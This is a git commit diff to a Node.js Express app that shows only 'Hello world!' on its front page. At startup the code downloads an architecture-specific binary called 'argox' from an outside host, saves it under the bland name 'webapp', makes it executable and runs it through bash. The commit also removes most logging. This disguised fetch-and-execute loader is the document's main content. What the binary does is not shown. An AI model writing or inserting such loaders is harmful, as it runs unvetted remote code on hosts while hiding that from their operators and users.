85ed8cd847c0770358d064b6a27afda2bb099e91
mmnni <eooce@outlook.com>
2025-02-18 00:24:10 +0800

    Update index.js

--- index.js
+++ index.js
@@ -1,18 +1,17 @@
 const express = require("express");
 const app = express();
+const os = require('os'); 
 const fs = require('fs');
 const path = require('path');
 const axios = require('axios');
 const { exec } = require('child_process');
-const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;
 const FILE_PATH = './.npm';
+const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;
 
-// http
 app.get("/", function(req, res) {
   res.send("Hello world!");
 });
 
-// log
 app.get("/log", (req, res) => {
   const logPath = path.join(FILE_PATH, 'log.txt');
   fs.readFile(logPath, "utf8", (err, data) => {
@@ -26,59 +25,52 @@ app.get("/log", (req, res) => {
   });
 });
 
-const downloadDiscord = async () => {
+const getDownloadUrl = () => {
+  const arch = os.arch(); 
+  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
+    return 'https://arm64.2go.us.kg/argox';
+  } else {
+    return 'https://amd64.2go.us.kg/argox';
+  }
+};
+
+const downloadFile = async () => {
   try {
-    //console.log('Start downloading discord...');
+    const url = getDownloadUrl();
+    // console.log(`Start downloading from ${url}...`);
     const response = await axios({
       method: 'get',
-      url: 'https://github.com/mmnni/pipeops/releases/download/sac/discord',
+      url: url,
       responseType: 'stream'
     });
 
-    const writer = fs.createWriteStream('discord');
+    const writer = fs.createWriteStream('webapp');
     response.data.pipe(writer);
 
     return new Promise((resolve, reject) => {
       writer.on('finish', () => {
-        console.log('Download completed, adding execute permission...');
-        exec('chmod +x discord', (err) => {
-          if (err) {
-            console.log('Failed to add execute permission:', err);
-            reject(err);
-          }
-          console.log('Execute permission added successfully');
+        console.log('Download completed');
+        exec('chmod +x webapp', (err) => {
+          if (err) reject(err);
           resolve();
         });
       });
-      writer.on('error', err => {
-        console.log('Write error:', err);
-        reject(err);
-      });
+      writer.on('error', reject);
     });
   } catch (err) {
-    console.log('Download error:', err);
     throw err;
   }
 };
 
 const Execute = async () => {
   try {
-    await downloadDiscord();
-    
-    console.log('Starting discord...');
-    const command = './discord';
+    await downloadFile();
+    const command = './webapp';
     exec(command, { 
       shell: '/bin/bash'
-    }, (error, stdout, stderr) => {
-      if (error) {
-        console.log('Execution error:', error);
-        return;
-      }
-      if (stdout) console.log('Output:', stdout);
-      if (stderr) console.log('Error:', stderr);
     });
   } catch (err) {
-    console.log('Process error:', err);
+    console.error('Error executing command:', err);
   }
 };
 
